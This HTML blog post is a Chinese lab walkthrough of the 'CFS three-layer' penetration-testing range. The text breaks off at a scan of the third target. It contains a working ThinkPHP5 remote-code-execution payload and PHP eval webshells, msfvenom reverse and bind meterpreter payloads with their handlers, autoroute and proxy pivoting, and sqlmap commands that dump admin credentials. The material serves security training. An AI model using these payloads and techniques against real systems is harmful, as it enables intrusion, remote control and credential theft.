@@ -1,0 +1,1605 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CFS三层靶机, f14g">
+    <meta name="description" content="环境配置环境的下载可以在Teamssix✌的公众号获取
+
+在导入虚拟机之前先设置虚拟机网卡
+
+然后在导入虚拟机
+攻击机：kali 配置网卡2
+靶机服务器：Centos7 配置2，3网卡
+内网主机：Ubuntu配置3，4，网卡
+内网主机：Wi">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>CFS三层靶机 | f14g</title>
+    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">f14g</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">f14g</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CFS三层靶机</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">CFS三层靶机</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                渗透
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-07-25
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-07-25
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    8 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>环境的下载可以在Teamssix✌的公众号获取</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725170621036.png" alt="image-20230725170621036"></p>
+<p>在导入虚拟机之前先设置虚拟机网卡</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230724111637440.png" alt="image-20230724111637440"></p>
+<p>然后在导入虚拟机</p>
+<p>攻击机：kali 配置网卡2</p>
+<p>靶机服务器：Centos7 配置2，3网卡</p>
+<p>内网主机：Ubuntu配置3，4，网卡</p>
+<p>内网主机：Windows7 配置4网卡</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230724094736346.png" alt="image-20230724094736346"></p>
+<p>然后需要打开宝塔后台页面</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230724103404798.png" alt="image-20230724103404798"></p>
+<p>把对应的IP改为自己的IP就可以登陆上宝塔后台页面了</p>
+<p>点击网站-&gt;网站名-&gt;把Centos网卡三的IP加里面</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725090940754.png" alt="image-20230725090940754"></p>
+<p>Ubuntu也是同样操做</p>
+<p>到这里环境搭建完成了</p>
+<p>攻击机kali:192.168.1.129</p>
+<p>Target1:192.168.1.130     192.168.22.131</p>
+<p>Target2:192.168.22.130   192.168.33.128</p>
+<p>Target3:192.168.33.33</p>
+<h1 id="攻击Target1"><a href="#攻击Target1" class="headerlink" title="攻击Target1"></a>攻击Target1</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>nmap扫描一下Target</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725091112138.png" alt="image-20230725091112138"></p>
+<p>发现开放的端口还挺多21，22，80，3306都开着呢</p>
+<h2 id="2-获取shell"><a href="#2-获取shell" class="headerlink" title="2.获取shell"></a>2.获取shell</h2><p>那就先试试80端口，80端口的漏洞比较多</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725091216841.png" alt="image-20230725091216841"></p>
+<p>可以发现是Thinkphp5框架，我们可以随便传参看更详细版本</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230724141422479.png" alt="image-20230724141422479"></p>
+<p>然后可以找对应的payload进行尝试</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/index.php?s<span class="token operator">=</span>index/<span class="token punctuation">\</span>think<span class="token punctuation">\</span>app/invokefunction<span class="token operator">&amp;</span><span class="token assign-left variable">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>phpinfo<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725091255126.png" alt="image-20230725091255126"></p>
+<p>出现了phpinfo的页面说明存在漏洞</p>
+<p>可以利用工具进行上传木马，得到shell,但是没有找到特别好的工具只能手撸</p>
+<p>写马</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.130/index.php?s<span class="token operator">=</span>index/think<span class="token punctuation">\</span>app/invokefunction<span class="token operator">&amp;</span><span class="token assign-left variable">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>file_put_contents<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>shell.php<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>%27f14g%27<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上传成功</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725091433727.png" alt="image-20230725091433727"></p>
+<p>木马上传成功之后，用蚁剑连接</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725091615792.png" alt="image-20230725091615792"></p>
+<p>在根目录下 有&#x2F;flag.txt   flag{qEa12Nasd1a}</p>
+<p>在&#x2F;www&#x2F;wwwroot&#x2F;ThinkPHP&#x2F;public&#x2F;flag21sA.txt     flag{e2D3aFdasde}</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725091725598.png" alt="image-20230725091725598"></p>
+<p>目前已经拿到主机的shell了</p>
+<h2 id="3-获取主机权限"><a href="#3-获取主机权限" class="headerlink" title="3.获取主机权限"></a>3.获取主机权限</h2><p>然后通过msfvenom生成木马</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.1.129 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">2222</span> <span class="token parameter variable">-f</span> elf <span class="token operator">></span> shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230724164146870.png" alt="image-20230724164146870"></p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230724162704956.png" alt="image-20230724162704956"></p>
+<p>在kali中配置监听模块</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use /exploit/multi/handler
+<span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp
+<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.1.129
+<span class="token builtin class-name">set</span> lport <span class="token number">2222</span>
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725092121427.png" alt="image-20230725092121427"></p>
+<p>把刚刚生成的木马shell.elf上传导Target1,并赋予执行权限</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725091910508.png" alt="image-20230725091910508"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> shell.elf
+./shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230724164308105.png" alt="image-20230724164308105"></p>
+<p>成功拿到meterpreter</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725092249577.png" alt="image-20230725092249577"></p>
+<p>这就拿到了Target1的主机权限了</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230724171032774.png" alt="image-20230724171032774"></p>
+<p>我们可以执行这些命令</p>
+<p>例如</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230724171127723.png" alt="image-20230724171127723"></p>
+<p>因为这是我们搭建的靶机环境不带摄像头，现实中拿到主机权限之后还可以操做主机的摄像头</p>
+<h1 id="攻击Target2"><a href="#攻击Target2" class="headerlink" title="攻击Target2"></a>攻击Target2</h1><h2 id="1-信息收集-1"><a href="#1-信息收集-1" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>在刚刚我们拿到shell,ifconfig时发现Target1还有另外一个网卡</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725092325030.png" alt="image-20230725092325030"></p>
+<p>尝试直接namp扫描这个网段上的主机</p>
+<p>发现扫不出来，因为我是用我的kali机器作为攻击机，kali的ip相对于22网段是外网，所以扫不到</p>
+<p>但是我们可以用centos的ip打他的内网</p>
+<p>先用msf自带的探测网络接口的模块（get_local_subnets）</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run get_local_subnets<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725094505966.png" alt="image-20230725094505966"></p>
+<p>这里有三个网段，但是ifocnfig有两个，这个122网段应该没啥用</p>
+<p>查看路由的模块(autoroute -p)来进一步进行信息探测</p>
+<p>路由是指路由器从一个接口上收到数据包，根据数据包的目的地址进行定向并转发到另一个接口的过程，就相当于把我们要传输的数据先传输到该路由，再发往目标，centos上又没有msf，所以可以通过设置路由的方式把我们的请求从centos发出，这样不就可以在kali上访问到centos的ip了吗</p>
+<p>所以我们要添加22网段路由，简单理解为我们建立了一个攻击机kali和该网段的隧道</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run autoroute <span class="token parameter variable">-s</span> <span class="token number">192.168</span>.22.0/24
+run autoroute <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725095143652.png" alt="image-20230725095143652"></p>
+<h2 id="2-设置msf代理"><a href="#2-设置msf代理" class="headerlink" title="2.设置msf代理"></a>2.设置msf代理</h2><p>msf自带的有一个代理模块auxiliary&#x2F;server&#x2F;socks_proxy</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725103221855.png" alt="image-20230725103221855"></p>
+<p>然后进入proxychains的配置文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/proxychains.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725103308146.png" alt="image-20230725103308146"></p>
+<p>代理设置好之后可以扫描端口试试</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap <span class="token parameter variable">-sT</span> <span class="token parameter variable">-Pn</span> <span class="token number">192.168</span>.22.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这样扫的太慢了</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap-T4 <span class="token number">192.168</span>.22.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725121443323.png" alt="image-20230725121443323"></p>
+<h2 id="3-获取shell"><a href="#3-获取shell" class="headerlink" title="3.获取shell"></a>3.获取shell</h2><p>可以发现80端口依旧开着，那就先访问80端口，不过浏览器上要配置代理</p>
+<p>访问之后在源代码里提示sql注入</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725143451480.png" alt="image-20230725143451480"></p>
+<p>直接用sqlmap跑</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">proxychains4 sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.22.130/index.php?r=vul&amp;keyword=1"</span>  <span class="token comment">--dbs --batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725144420538.png" alt="image-20230725144420538"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.22.130/index.php?r=vul&amp;keyword=1"</span> <span class="token parameter variable">-D</span> bagecms <span class="token parameter variable">--tables</span> <span class="token parameter variable">--batch</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725145325841.png" alt="image-20230725145325841"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.22.130/index.php?r=vul&amp;keyword=1"</span> <span class="token parameter variable">-D</span> bagecms <span class="token parameter variable">-T</span> bage_admin <span class="token parameter variable">--columns</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725145550246.png" alt="image-20230725145550246"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.22.130/index.php?r=vul&amp;keyword=1"</span> <span class="token parameter variable">-D</span> bagecms <span class="token parameter variable">-T</span> bage_admin <span class="token parameter variable">-C</span> password,username <span class="token parameter variable">--dump</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725145751085.png" alt="image-20230725145751085"></p>
+<p>这样就拿到了账号和密码</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725150059127.png" alt="image-20230725150059127"></p>
+<p>查看robots.txt</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725150142872.png" alt="image-20230725150142872"></p>
+<p>访问出现登陆页面里，进行登录</p>
+<p>登陆上之后有一个flag</p>
+<p>然后找找可以利用的点</p>
+<p>找到有文件编辑的地方把一句话木马直接写里面试试</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725152709507.png" alt="image-20230725152709507"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"aaa"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f14g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>然后写入木马的位置是  tag  标签的意思</p>
+<p>然后我们找到标签所在位置看是否出现 <strong>aaa</strong></p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725152809484.png" alt="image-20230725152809484"></p>
+<p>蚁剑连接</p>
+<p>因为只是靶机搭建的是仅主机模式，在这里可以直接连接，其实是需要通过SocksCap、proxifier类似工具配置代理</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725152957665.png" alt="image-20230725152957665"></p>
+<p>这样我们就获取主机的shell</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725154226619.png" alt="image-20230725154226619"></p>
+<p>发现它也是两个网卡，说明有可能在33这个c段还存在存活主机</p>
+<h2 id="4-获取主机权限"><a href="#4-获取主机权限" class="headerlink" title="4.获取主机权限"></a>4.获取主机权限</h2><p>然后同样的操做利用msf生成木马文件</p>
+<p>从蚁剑终端可以看出 Target是一个64位LINUX系统</p>
+<p>这里需要注意的是<strong>木马的shell只能用正向</strong>，因为我们是搭建隧道来访问的乌班图，因为我们正常访问是访问不到的，但是它处于内网中也访问不到我们，而且让他通过隧道来找我们是不现实的，所以还是得我们通过隧道去找他，所以只能正向</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> linux/x64/meterpreter/bind_tcp <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">1111</span> <span class="token parameter variable">-f</span> elf <span class="token operator">></span> shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725153719994.png" alt="image-20230725153719994"></p>
+<p>把生成的木马文件上传到蚁剑中</p>
+<p>把生成的木马文件上传到蚁剑中并赋予执行权限</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725154000204.png" alt="image-20230725154000204"></p>
+<p>在kali中设置监听</p>
+<p>在MSF中开启EXP，与Target2建立连接，这里需要注意，上一次代理使用的reverse_tcp是MSF作为监听，让Target1连到我们，而这次代理使用的bind_tcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的。<br><strong>msf这里也需要走代理 ，</strong>就是在用proxychains msfconsole来启动msf</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains msfconsole
+use /exploit/multi/handler
+<span class="token builtin class-name">set</span> payload linux/x64/meterpreter/bind_tcp
+<span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.22.130
+<span class="token builtin class-name">set</span> lport <span class="token number">1111</span>
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725160052974.png" alt="image-20230725160052974"></p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725160125919.png" alt="image-20230725160125919"></p>
+<p>可以看到这个时候我们就拿到了meterpreter</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725160407323.png" alt="image-20230725160407323"></p>
+<p>也就获得主机的权限</p>
+<h1 id="攻击Target3"><a href="#攻击Target3" class="headerlink" title="攻击Target3"></a>攻击Target3</h1><h2 id="1-信息收集-2"><a href="#1-信息收集-2" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>我们在拿到Target2主机shell的时候，发现还存在33的c段</p>
+<p>尝试直接namp扫描这个网段上的主机，但是肯定是扫不出来的</p>
+<p>同理我们可以利用攻击Target2时候的靶机方法攻击来攻击Target3</p>
+<p>先用msf自带的探测网络接口的模块（get_local_subnets）</p>
+<pre class="line-numbers language-none"><code class="language-none">run get_local_subnets<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725164610749.png" alt="image-20230725164610749"></p>
+<p>查看路由的模块(autoroute -p)来进一步进行信息探测,然后添加33路由</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run autoroute <span class="token parameter variable">-s</span> <span class="token number">192.168</span>.33.0/24
+run autoroute <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="2-设置msf代理-1"><a href="#2-设置msf代理-1" class="headerlink" title="2.设置msf代理"></a>2.设置msf代理</h2><h2 id="3-获取主机权限-1"><a href="#3-获取主机权限-1" class="headerlink" title="3.获取主机权限"></a>3.获取主机权限</h2><p>用nmap扫描开放的端口</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap <span class="token parameter variable">-T4</span> <span class="token parameter variable">-Pn</span> <span class="token number">192.168</span>.33.33 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
